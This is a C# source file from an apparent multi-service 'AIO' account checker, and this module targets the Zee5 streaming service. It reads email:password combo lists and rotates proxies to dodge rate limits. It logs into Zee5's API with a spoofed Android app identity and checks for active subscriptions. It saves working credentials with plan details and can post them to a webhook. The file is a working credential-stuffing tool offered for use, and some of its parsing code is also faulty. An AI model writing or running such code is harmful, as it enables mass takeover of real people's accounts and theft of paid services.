using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Zee5
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text3 = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            req.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 7.1.2; HUAWEI MLA-L12 Build/HUAWEIMLA-L12)";
                            req.AddHeader("X-Z5-Appversion", "17.0.0.6");
                            req.AddHeader("X-Z5-AppPlatform", "Android Mobile");
                            req.AddHeader("Host", "userapi.zee5.com");
                            req.AddHeader("Accept-Encoding", "gzip");

                            string get = req.Get("https://userapi.zee5.com/v1/user/loginemail?email=" + array[0] + "&password=" +
                                                 array[1]).ToString();

                            if (get.Contains("The email address and password combination was wrong during login"))
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }
                            else if (get.Contains("{\"token\":\""))
                            {
                                string Atoken = Parse(get, "{\"token\":\"", "\"}");
                                req.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 7.1.2; HUAWEI MLA-L12 Build/HUAWEIMLA-L12)";
                                req.AddHeader("X-Z5-Appversion", "17.0.0.6");
                                req.AddHeader("X-Z5-AppPlatform", "Android Mobile");
                                req.AddHeader("Authorization", "bearer " + Atoken);
                                req.AddHeader("Host", "userapi.zee5.com");
                                req.AddHeader("Accept-Encoding", "gzip");

                                string get1 =
                                    req.Get("https://subscriptionapi.zee5.com/v1/subscription?translation=en&include_active=true").ToString();
                                string PlanName = Parse(get, "\"original_title\":\"", "\",");
                                string ExipryDate = Parse(get, "\"subscription_end\":\"", "T");
                                string AutoRenwal = Parse(get, "\"recurring_enabled\":", ",");
                                if (get1.Contains("state\":\"activated"))
                                {
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Zee5", array[0] + ":" + array[1] + $" | Plan Name - {PlanName} | Exipry Date - {ExipryDate} | Auto Renwal - {AutoRenwal}");
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("Zee5", array[0] + ":" + array[1] + $" | Plan Name - {PlanName} | Exipry Date - {ExipryDate} | Auto Renwal - {AutoRenwal}");
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1], "Zee5 Hits");
                                }
                                else
                                {
                                    Program.Frees++;
                                    Program.TotalChecks++;
                                    if (Program.lorc == "LOG")
                                        Settings.PrintFree("Zee5", array[0] + ":" + array[1] + $" | Plan Name - {PlanName} | Exipry Date - {ExipryDate} | Auto Renwal - {AutoRenwal}");
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1], "Zee5 Frees");
                                }

                            }
                            else
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }


                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text3);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        public static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}